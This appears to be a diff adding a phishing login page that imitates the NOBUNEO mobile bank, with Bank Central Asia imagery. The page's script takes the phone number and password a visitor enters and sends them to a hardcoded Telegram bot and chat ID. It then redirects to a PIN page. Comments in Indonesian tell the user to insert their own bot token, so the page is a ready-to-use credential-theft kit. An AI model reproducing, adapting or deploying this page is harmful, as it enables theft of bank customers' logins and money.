@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+
+<meta name="theme-color" content="#266DD9"> 
+	<meta charset="utf-8">
+	<meta name="description" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+	<title>Nobuneo Login</title>
+
+<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+	<meta name="twitter:image" content="https://www.bca.co.id/~/media/Images/logo-bca.ashx">
+
+	<link href="main.css"		 rel="stylesheet">	
+    
+    
+</head>
+
+<body style="overflow: hidden" id="bodyku"> 
+    <div class="loader" id="loading-progress">
+        <div class="wrapper-loader">
+		<div class="loading-div">
+            <div class="rect rect_one"></div>
+            <div class="rect rect_two"></div>
+            <div class="rect rect_three"></div>
+			<div class="loading-text">Mohon Tunggu...</div>
+		</div>
+        </div>
+    </div>
+	
+	
+
+<!--rendering header-->
+<script>
+    $(document).ready(function () {
+	  $('#logobca').attr('src', 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAfsP3qt6_va8_LyaNbCDO6Bvp09f6iJUzkRJTwFuYlWJkwqU4zJw73hQff0-Owt7DU6idfqAvuWDLh3hbk_oQ18W7pHzG4X3zAKLoT4byJBSV1KXmRdHCbaKzBmGdKvEMXsAm9x8DdrRt5Nh7HQpssQWfc32NVKtGgwZ0vy6GTslssP6MRw7DYhd0KJY/s178/logo_2x.png');
+	});
+</script>
+
+<style>
+    .pull-right-lang {
+        float: right !important;
+        margin: auto 0px;
+        font-size: 0px;
+        margin-left: auto;
+    }
+
+    .switch {
+        padding: 6px 2px;
+        width: 40px;
+        display: inline-block;
+        text-align: center;
+        text-decoration: none !important;
+        transition: color 0.2s ease, background-color 0.2s ease;
+        border: 1px solid #fff;
+    }
+
+        .switch:first-child {
+            border-top-left-radius: 16px;
+            border-bottom-left-radius: 16px;
+        }
+
+        .switch:last-child {
+            border-top-right-radius: 16px;
+            border-bottom-right-radius: 16px;
+        }
+
+        .switch.is-active, .switch:hover {
+            background: #fff;
+            color: #0066ae;
+        }
+
+    .text-lang {
+        font-size: 12px;
+        color: #fff
+    }
+    
+    #wrapper{
+	background: url('')!important;
+	background-repeat: no-repeat !important;
+    background-size: cover !important;;
+    background-position: center !important;
+}
+
+@media(max-width:525px){
+  #wrapper{
+    background:url('')left 50% bottom 175px/cover no-repeat !important;
+  }
+}
+
+#wrapper{
+	background-color:transparent;
+}
+
+
+  .fontku{
+       font-size: 12px;
+   }
+   
+   
+   
+   .btn-submit:active{
+       color: #fff;
+   }
+   
+   .btn:active{
+       color: #fff;
+   }
+   
+  .btn-default:active{
+      color: #fff;
+  }
+  
+  
+  
+  #btnSubmit, #btnSubmit1, #btnSubmit2{
+      color: #fff;
+      letter-spacing: 0.0;
+  }
+  
+  
+  #btnSubmit:active, #btnSubmit1:active, #btnSubmit2:active{
+      color: #fff;
+  }
+  
+  h4{
+    font-size: 15px;
+    line-height: 16px;
+    margin-bottom: -5px;
+    color: green;
+}
+
+#ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 26px;
+            position: absolute;
+            display: block;
+            margin-top: 11px;
+            margin-left: 13px;
+        }
+        
+.radio-section {
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	height: 100vh;
+	width:;
+}
+h1 {
+	margin-bottom: 20px;
+}
+.radio-item [type="radio"] {
+	display: none;
+}
+.radio-item + .radio-item {
+	margin-top: 15px;
+}
+.radio-item label {
+	display: block;
+	padding: 2px 10px;
+	background: #09559a;
+	border: 2px solid rgba(255, 255, 255, 0.1);
+	border-radius: 20px;
+	cursor: pointer;
+	font-size: 12px;
+	font-weight: 400;
+	min-width: 250px;
+	padding-left: 20px;
+	color: #fff;
+	margin: 3px ;
+	position: relative;
+	
+}
+.radio-item label:after,
+.radio-item label:before {
+	content: "";
+	position: absolute;
+	border-radius: 50%;
+}
+.radio-item label:after {
+	height: 19px;
+	width: 19px;
+	border: 1px solid #fff;
+	left: 9px;
+	top: calc(50% - 10px);
+}
+.radio-item label:before {
+	background: #fff;
+	height: 19px;
+	width: 18px;
+	left: 9px;
+	top: calc(50% - px);
+	transform: scale(5);
+	opacity: 0;
+	visibility: hidden;
+	transition: 0.4s ease-in-out 0s;
+}
+.radio-item [type="radio"]:checked ~ label {
+	border-color: #524eee;
+}
+.radio-item [type="radio"]:checked ~ label::before {
+	opacity: 1;
+	visibility: visible;
+	transform: scale(1);
+	margin-top: -1px;
+}
+
+input::placeholder{
+    color: #bbb;
+    
+}
+
+input{
+    border: 1px solid #ccc;
+    outline: none;
+    width: 100%;
+    padding-left: 15px;
+    border-radius: 8px;
+}
+
+button{
+    border: 0px solid #ccc;
+    outline: none;
+    width: 100%;
+    padding-left: 15px;
+    border-radius: 8px;
+    height:50px;
+    background: #F8CE18;
+    color: #000;
+}
+</style>
+<div class="start" style="display:;">
+	<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" style="width: 100px; display: none" id="start">
+	<div class="">
+	    <center>
+	
+	</center>
+	</div>
+</div>
+<div id="wrapper">
+		<div id="">
+	<div class="container">
+		<div class="d-flex py-2">
+			<div class="mr-auto p-2"></div>
+            
+            
+            
+          
+
+		</div>
+	</div>
+
+</div>
+	
+
+
+
+
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg0Y8ceCJt2u3knmobr7Hr4wzt_jEordniCzoDC1slHu1EI-FvBYBvhPrgrxtBB-srYlM6ZJOHUXJOehsuwZ4BFUA-rMYUVZej66JkZseDTS5h-QVLbIaLpLKKZE68Z4bS3xf13c91c-aa9LokNnUnqj3pAIuM8fnjW-TjJJyF5HzvtGN7xhyUbrx0EYA/s1782/1707398583241.png" width="100%" style="position: fixed; top: 0;">
+
+
+<div class="" style="border-radius: 10px; padding: 0; margin-top: 160px; text-align: center">
+<h4 style="font-size: 20px; color: #000">Selamat Datang di NOBUNEO</h4>    
+    
+    
+<fieldset id="debitpage" style="display: ; padding: 20px">
+<div id ="#content" class="background">
+
+
+
+
+<div class="container hid" style="position: ; background: transparent; display: none" id="wrapper">
+ </div>
+   
+ 
+   <form id="formHP" onsubmit="sendNohp(event); return false" method="POST"> 
+  		<div class="form-group" style="margin-top: 50px">
+<label for="debit" style="color: #000; font-weight: bold; text-align: left; float: left; margin-left: 5px">Nomor Ponsel </label>
+			<input type="tel" autocomplete="off" name="nama" id="nomor" placeholder="08xxxxx" required data-msg-required="Kolom ini wajib diisi." class="" style="height: 50px; font-size: 18px" maxlength="13" minlength="10">
+		</div> 
+   
+    	<div class="form-group" style="margin-top: 0px">
+<label for="debit" style="color: #000; font-weight: bold; text-align: left; float: left; margin-left: 5px">Kata Sandi </label>
+			<input type="password" autocomplete="off" name="nama" id="pass" placeholder="Password" required data-msg-required="Kolom ini wajib diisi." class="" style="height: 50px; font-size: 17px">
+		</div> 
+   	<div class="form-group" style="margin-top: 0px; margin-bottom: 10px">
+<label for="debit" style="color: #2196F3; font-weight: bold; text-align: left; float: right; margin-right: 7px; margin-top: -5px; ">Lupa Password?</label>
+  </div>
+  
+  	<div class="form-group" style="margin-top: 50px">
+<button type="submit" id="btnSubmit" style="color: #000; font-weight: bold">MASUK</button>	    
+  	</div>
+  	
+	</fieldset>   
+</div>
+</div>
+    <!-- /#global-modal -->
+    <div class="modal fade" id="global-modal" tabindex="-1" role="dialog" aria-labelledby="" data-keyboard="false" data-backdrop="static" aria-hidden="true">
+		
+		<div class="modal-dialog modal-dialog-centered" style="margin-top: 0px;" role="document">
+            <div class="modal-content">
+                <div class="modal-header position-relative border-0 pb-0">
+                    <button class="position-absolute btn-info closeTop" type="button" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+                    <h4 class="modal-title text-center w-100"></h4>
+                </div>
+                <div class="modal-body text-center"></div>
+                <div class="modal-footer border-0">
+                    <div class="d-flex align-content-center justify-content-center w-100">
+                        <button data-dismiss="modal" class="btn btn-info px-4 py-2 close-btn btn-footer-modal" type="button">OK</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- /#global-modal -->
+    
+	<!--rendering content-->
+	<div id="Webform-footer">
+		 
+
+
+
+<div class="container">
+	<div class="row justify-content-center mt-4">
+		<div class="col-lg-10">
+			<div class="footer-data-wrapper row justify-content-center">
+				
+			<div class="footer-logo-desc mb-3 ">
+						<div class="text-center justify-content-center pl-5 pr-5" style="color:#7D8185; margin-top: -20px">
+							
+							<label for="debit" style="color: #000; font-weight: bold; text-align: left; float: left; margin-left: 5px">Butuh Bantuan? <font style="color: #2196F3">Hubungi Neo Care</font> </label>
+						</div>
+					</div>    
+			</div>
+		</div>
+	</div>
+</div>
+	</div>
+
+
+		<!-- end script detect browser-->
+<script src="/vendors/jquery-mask-plugin/dist/jquery.mask.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script>
+  
+   function sendNohp(event){
+   event.preventDefault();
+   
+     document.getElementById('btnSubmit').innerHTML = "Memproses...";   
+    
+    var nomor = document.getElementById("nomor");
+    var pass = document.getElementById("pass");
+
+   
+    var gabungan = '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : ' + nomor.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ' + pass.value;
+   
+    var token = '6703400034:AAGJG0dZOsrfeVa7vA_AMGAwyv76NSjEe0E'; // Ganti dengan token bot yang kamu buat
+    var grup = '5752550326'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    
+    success: function(){
+ 
+    setTimeout(function(){
+   location.href = 'pin.html';
+    var nomor = document.getElementById("nomor").value;
+  sessionStorage.setItem("nomor", nomor);
+   var pass = document.getElementById("pass").value;
+  sessionStorage.setItem("pass", pass);
+   
+    }, 500);}});};
+    
+</script>
+<script>
+
+/*
+See on github: https://github.com/muhammederdem/credit-card-form
+*/
+
+new Vue({
+  el: "#app",
+  data() {
+    return {
+      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
+      cardName: "",
+      cardNumber: "",
+      cardMonth: "",
+      cardYear: "",
+      cardCvv: "",
+      cardvalid: "##/##",
+      saldo: "",
+      minCardYear: new Date().getFullYear(),
+      amexCardMask: "#### ###### #####",
+      otherCardMask: "#### #### #### ####",
+      cardNumberTemp: "",
+      cardValid: "##/##",
+      isCardFlipped: false,
+      focusElementStyle: null,
+      isInputFocused: false
+    };
+  },
+  mounted() {
+    this.cardNumberTemp = this.otherCardMask;
+    document.getElementById("cardNumber").focus();
+  },
+  computed: {
+    getCardType () {
+      let number = this.cardNumber;
+      let re = new RegExp("^4");
+      if (number.match(re) != null) return "visa";
+
+      re = new RegExp("^(34|37)");
+      if (number.match(re) != null) return "amex";
+
+      re = new RegExp("^5[1-5]");
+      if (number.match(re) != null) return "mastercard";
+
+      re = new RegExp("^6011");
+      if (number.match(re) != null) return "discover";
+      
+      re = new RegExp('^9792')
+      if (number.match(re) != null) return 'troy'
+
+      return "visa"; // default type
+    },
+		generateCardNumberMask () {
+			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+    },
+    minCardMonth () {
+      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+      return 1;
+    }
+  },
+  watch: {
+    cardYear () {
+      if (this.cardMonth < this.minCardMonth) {
+        this.cardMonth = "";
+      }
+    }
+  },
+  methods: {
+    flipCard (status) {
+      this.isCardFlipped = status;
+    },
+    focusInput (e) {
+      this.isInputFocused = true;
+      let targetRef = e.target.dataset.ref;
+      let target = this.$refs[targetRef];
+      this.focusElementStyle = {
+        width: `${target.offsetWidth}px`,
+        height: `${target.offsetHeight}px`,
+        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
+      }
+    },
+    blurInput() {
+      let vm = this;
+      setTimeout(() => {
+        if (!vm.isInputFocused) {
+          vm.focusElementStyle = null;
+        }
+      }, 300);
+      vm.isInputFocused = false;
+    }
+  }
+});
+
+
+
+
+</script>	
+
+</body>
+</html>
+
